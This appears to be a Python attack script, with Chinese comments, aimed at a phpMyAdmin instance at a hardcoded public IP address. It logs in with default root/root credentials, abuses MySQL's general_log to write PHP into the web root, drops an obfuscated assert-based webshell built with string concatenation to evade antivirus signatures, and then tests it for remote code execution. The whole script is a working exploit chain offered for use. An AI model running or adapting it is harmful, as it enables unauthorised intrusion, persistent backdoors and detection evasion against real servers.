#!/usr/bin/env python3
"""写免杀webshell: assert方式 + 字符串拼接绕过特征检测"""
import urllib.request, http.cookiejar, re, urllib.parse, time, base64

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# 免杀shell: assert 方式, 无明文eval
# <?php $f='as'.'sert';@$f($_POST['x']);?>
shell = "<?php $f='as'.'sert';@$f($_POST['x']);?>"
b64 = base64.b64encode(shell.encode()).decode()
print("shell b64:", b64, flush=True)

sql("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/tw.php'")
sql("SET GLOBAL general_log = 'ON'")
r = sql(f"SELECT '<?php echo var_export(@file_put_contents(\"C:/phpStudy/WWW/yy.php\", base64_decode(\"{b64}\")), true);?>'")
sql("SET GLOBAL general_log = 'OFF'")
time.sleep(1)

import urllib.request as ur
rr = ur.urlopen(urllib.request.Request("http://81.70.245.25/tw.php", headers={"User-Agent":"Mozilla/5.0"}), timeout=8)
body = rr.read().decode("utf-8","ignore")
for line in body.split("\n"):
    if "Query\tSELECT" in line and "file_put" not in line and "general_log" not in line:
        print("写入结果:", line.strip()[line.find("SELECT"):][:60], flush=True)

# 验证
for shell_name in ["yy.php"]:
    try:
        data = b"x=echo ALIVE_YY_9988;"
        rr = ur.urlopen(urllib.request.Request(f"http://81.70.245.25/{shell_name}", data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=8)
        body = rr.read().decode("utf-8","ignore")
        print(f"{shell_name} RCE:", "ALIVE_YY_9988" in body, "|", body.strip()[-100:], flush=True)
    except Exception as e:
        print(f"{shell_name} ERR:", str(e)[:80], flush=True)
